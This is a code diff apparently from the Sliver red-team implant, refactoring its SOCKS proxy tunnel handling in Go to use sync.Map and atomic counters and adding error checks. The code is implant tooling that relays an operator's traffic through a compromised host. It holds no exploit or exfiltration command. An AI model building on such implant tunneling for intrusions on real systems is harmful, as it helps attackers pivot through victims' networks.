@@ -20,10 +20,12 @@ package handlers
 
 import (
 	"context"
+	"errors"
 	"fmt"
 	"io"
 	"net"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	// {{if .Config.Debug}}
@@ -415,17 +417,11 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 }
 
 type socksTunnelPool struct {
-	tunnels    map[uint64]chan []byte
-	readMutex  *sync.Mutex
-	writeMutex *sync.Mutex
-	Sequence   map[uint64]uint64
+	tunnels *sync.Map // map[uint64]chan []byte
 }
 
 var socksTunnels = socksTunnelPool{
-	tunnels:    map[uint64]chan []byte{},
-	readMutex:  &sync.Mutex{},
-	writeMutex: &sync.Mutex{},
-	Sequence:   map[uint64]uint64{},
+	tunnels: &sync.Map{},
 }
 
 var socksServer *socks5.Server
@@ -463,15 +459,19 @@ func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 	// {{end}}
 
 	// init tunnel
-	if _, ok := socksTunnels.tunnels[socksData.TunnelID]; !ok {
-		socksTunnels.tunnels[socksData.TunnelID] = make(chan []byte, 10)
-		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
+	if tunnel, ok := socksTunnels.tunnels.Load(socksData.TunnelID); !ok {
+		tunnelChan := make(chan []byte, 10)
+		socksTunnels.tunnels.Store(socksData.TunnelID, tunnelChan)
+		tunnelChan <- socksData.Data
 		err := socksServer.ServeConn(&socks{stream: socksData, conn: connection})
 		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[socks] Failed to serve connection: %v", err)
+			// {{end}}
 			return
 		}
 	} else {
-		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
+		tunnel.(chan []byte) <- socksData.Data
 	}
 }
 
@@ -485,38 +485,43 @@ type socks struct {
 }
 
 func (s *socks) Read(b []byte) (n int, err error) {
-	socksTunnels.readMutex.Lock()
-	channel := socksTunnels.tunnels[s.stream.TunnelID]
-	socksTunnels.readMutex.Unlock()
-	data := <-channel
+	channel, ok := socksTunnels.tunnels.Load(s.stream.TunnelID)
+	if !ok {
+		return 0, errors.New("[socks] invalid tunnel id")
+	}
+
+	data := <-channel.(chan []byte)
 	return copy(b, data), nil
 }
 
 func (s *socks) Write(b []byte) (n int, err error) {
-	socksTunnels.writeMutex.Lock()
 	data, err := proto.Marshal(&sliverpb.SocksData{
 		TunnelID: s.stream.TunnelID,
 		Data:     b,
-		Sequence: s.Sequence,
+		Sequence: atomic.LoadUint64(&s.Sequence),
 	})
 	if !s.conn.IsOpen {
 		return 0, err
 	}
 	// {{if .Config.Debug}}
-	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", s.Sequence, len(b), b)
+	log.Printf("[socks] (implant to Server) to Client to User Data Sequence %d, Data Size %d Data %v\n", atomic.LoadUint64(&s.Sequence), len(b), b)
 	// {{end}}
 	s.conn.Send <- &sliverpb.Envelope{
 		Type: sliverpb.MsgSocksData,
 		Data: data,
 	}
-	socksTunnels.writeMutex.Unlock()
-	s.Sequence++
+
+	atomic.AddUint64(&s.Sequence, 1)
 	return len(b), err
 }
 
 func (s *socks) Close() error {
-	close(socksTunnels.tunnels[s.stream.TunnelID])
-	delete(socksTunnels.tunnels, s.stream.TunnelID)
+	channel, ok := socksTunnels.tunnels.LoadAndDelete(s.stream.TunnelID)
+	if !ok {
+		return errors.New("[socks] can't close unknown channel")
+	}
+	close(channel.(chan []byte))
+
 	data, err := proto.Marshal(&sliverpb.SocksData{
 		TunnelID:  s.stream.TunnelID,
 		CloseConn: true,
